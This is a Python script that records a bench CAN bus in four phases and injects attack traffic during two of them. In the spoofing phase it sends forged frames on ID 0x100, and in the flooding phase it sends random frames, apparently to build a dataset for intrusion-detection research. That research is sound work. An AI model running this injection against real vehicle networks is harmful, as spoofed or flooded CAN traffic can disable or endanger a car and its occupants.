#!/usr/bin/env python3
"""Four-phase physical CAN capture (baseline / spoofing / flooding / recovery).

Bench: STM32 Nucleo-L476RG + MCP2515 (ECU, 500 kbit/s) <-> CANable V2.0 Pro (this host).
The CANable monitors the bus and injects the attack frames. A CAN node does not
receive its own transmissions, so injected frames are logged separately (_tx.log,
timestamped at send time) from the frames observed on the bus (_rx.log).
Log format is candump -L: (epoch) can0 ID#DATA.
"""
import argparse, json, platform, random, threading, time
import can

ap = argparse.ArgumentParser()
ap.add_argument("--out", required=True, help="output prefix")
ap.add_argument("--baseline", type=float, default=180)
ap.add_argument("--spoof", type=float, default=120)
ap.add_argument("--flood", type=float, default=120)
ap.add_argument("--recovery", type=float, default=180)
ap.add_argument("--seed", type=int, default=2026110501)
ap.add_argument("--port", default="COM9")
a = ap.parse_args()

random.seed(a.seed)
bus = can.Bus(interface="slcan", channel=a.port, bitrate=500000)
rx = open(a.out + "_rx.log", "w", newline="\n")
tx = open(a.out + "_tx.log", "w", newline="\n")
stop = threading.Event()
rx_count = [0]


def rx_loop():
    while not stop.is_set():
        m = bus.recv(timeout=0.2)
        if m is not None:
            rx.write(f"({m.timestamp:.6f}) can0 {m.arbitration_id:03X}#{m.data.hex().upper()}\n")
            rx_count[0] += 1


th = threading.Thread(target=rx_loop, daemon=True)
th.start()


def run_phase(name, dur):
    t0 = time.time()
    end = t0 + dur
    n = errs = 0
    if name in ("spoofing", "flooding"):
        period = 0.02 if name == "spoofing" else 0.01
        nxt = t0
        while time.time() < end:
            if name == "spoofing":
                aid = 0x100
                data = bytes([random.randint(180, 200), 0x00, 0x94, 0x11, 0x5F, 0x5B, 0x46, 0x00])
            else:
                aid = random.randrange(0, 0x800)
                data = bytes(random.randrange(256) for _ in range(8))
            ts = time.time()
            try:
                bus.send(can.Message(arbitration_id=aid, data=data, is_extended_id=False), timeout=0.1)
                tx.write(f"({ts:.6f}) can0 {aid:03X}#{data.hex().upper()}\n")
                n += 1
            except Exception:
                errs += 1
            nxt += period
            d = nxt - time.time()
            if d > 0:
                time.sleep(d)
    else:
        time.sleep(dur)
    return {"phase": name, "start_epoch_s": t0, "end_epoch_s": time.time(),
            "planned_s": dur, "injected_frames": n, "send_errors": errs}


phases = []
for name, dur in (("baseline", a.baseline), ("spoofing", a.spoof),
                  ("flooding", a.flood), ("recovery", a.recovery)):
    print(f"[{time.strftime('%H:%M:%S')}] phase {name} ({dur:.0f} s)", flush=True)
    phases.append(run_phase(name, dur))

time.sleep(0.5)
stop.set()
th.join(timeout=2)
rx.close(); tx.close(); bus.shutdown()
meta = {"python": platform.python_version(), "python_can": can.__version__, "port": a.port,
        "bitrate": 500000, "seed": a.seed, "rx_frames": rx_count[0], "phases": phases}
json.dump(meta, open(a.out + "_phases.json", "w"), indent=2)
print("DONE rx_frames =", rx_count[0], flush=True)
for p in phases:
    print(f"  {p['phase']:9s} planned={p['planned_s']:.0f}s injected={p['injected_frames']} errs={p['send_errors']}")
